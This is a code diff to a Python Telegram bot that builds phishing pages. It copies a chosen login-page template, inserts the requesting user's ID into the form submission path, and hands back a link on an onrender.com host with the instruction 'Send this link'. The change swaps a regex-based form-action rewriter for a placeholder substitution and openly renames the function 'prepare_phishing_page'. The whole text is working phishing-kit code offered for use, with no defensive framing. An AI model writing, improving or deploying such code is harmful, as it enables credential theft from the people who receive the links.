@@ -245,7 +245,7 @@ def handle_template_selection(message):
 
     if os.path.exists(template_path):
         try:
-            # Copy the template directory contents to the user's directory
+            # Copy all files from template directory to output directory
             template_dir = f"{TEMPLATES_DIR}/{template}"
             for item in os.listdir(template_dir):
                 src = os.path.join(template_dir, item)
@@ -255,16 +255,16 @@ def handle_template_selection(message):
                 elif os.path.isdir(src):
                     shutil.copytree(src, dst, dirs_exist_ok=True)
 
-            # Add template info to track which form was used
+            # Add template info for tracking
             with open(f"{output_path}/template_info.txt", 'w') as f:
                 f.write(template)
 
-            # Modify the HTML to include the user_id in form action and preserve method
-            if modify_html_form(f"{output_path}/index.html", user_id, template):
+            # Prepare the phishing page with the user_id
+            if prepare_phishing_page(f"{output_path}/index.html", f"{output_path}/index.html", user_id, template):
                 phishing_url = f"https://notafish-1.onrender.com/phish/{user_id}"
                 bot.send_message(message.chat.id, f"✅ Done!\nSend this link:\n{phishing_url}")
             else:
-                bot.send_message(message.chat.id, "❌ Failed to modify HTML form.")
+                bot.send_message(message.chat.id, "❌ Failed to prepare phishing page.")
         except Exception as e:
             bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
     else:
@@ -272,63 +272,23 @@ def handle_template_selection(message):
 
 
 # Updated function to modify HTML file to keep the form method and add user_id to action
-def modify_html_form(html_path, user_id, template_name):
+def prepare_phishing_page(template_path, output_path, user_id, template_name):
     try:
-        with open(html_path, 'r', encoding='utf-8', errors='ignore') as f:
+        # Read the template HTML
+        with open(template_path, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
 
-        # More robust form detection and modification
-        # First, try to find forms with method and action
-        form_pattern = re.compile(r'<form.*?method=["\'](.*?)["\'].*?action=["\'](.*?)["\']', re.IGNORECASE | re.DOTALL)
-        form_matches = form_pattern.findall(content)
+        # Replace the USER_ID_PLACEHOLDER with the actual user_id
+        content = content.replace('USER_ID_PLACEHOLDER', user_id)
 
-        if form_matches:
-            # Replace form action but keep the original method
-            for method, action in form_matches:
-                # Keep original method but replace action
-                content = content.replace(
-                    f'method="{method}" action="{action}"',
-                    f'method="{method}" action="/submit/{user_id}"'
-                )
-                content = content.replace(
-                    f"method='{method}' action='{action}'",
-                    f"method='{method}' action='/submit/{user_id}'"
-                )
-        else:
-            # Look for forms with just method
-            method_pattern = re.compile(r'<form.*?method=["\'](.*?)["\']', re.IGNORECASE)
-            method_matches = method_pattern.findall(content)
-
-            if method_matches:
-                for method in method_matches:
-                    content = content.replace(
-                        f'method="{method}"',
-                        f'method="{method}" action="/submit/{user_id}"'
-                    )
-                    content = content.replace(
-                        f"method='{method}'",
-                        f"method='{method}' action='/submit/{user_id}'"
-                    )
-            else:
-                # If no form with method found, look for any form
-                form_pattern = re.compile(r'<form', re.IGNORECASE)
-                if form_pattern.search(content):
-                    content = form_pattern.sub(f'<form method="post" action="/submit/{user_id}"', content)
-                else:
-                    logger.warning(f"No form found in {html_path}")
-                    return False
-
-        # Add a hidden field to track which template was used
-        form_end_pattern = re.compile(r'</form>', re.IGNORECASE)
-        if form_end_pattern.search(content):
-            content = form_end_pattern.sub(f'<input type="hidden" name="template" value="{template_name}"></form>',
-                                           content)
-
-        with open(html_path, 'w', encoding='utf-8') as f:
+        # Write the modified content to the output path
+        with open(output_path, 'w', encoding='utf-8') as f:
             f.write(content)
+
+        logger.info(f"Successfully prepared phishing page for {template_name} with user_id {user_id}")
         return True
     except Exception as e:
-        logger.error(f"Error modifying HTML: {e}")
+        logger.error(f"Error preparing phishing page: {e}")
         return False
 
 
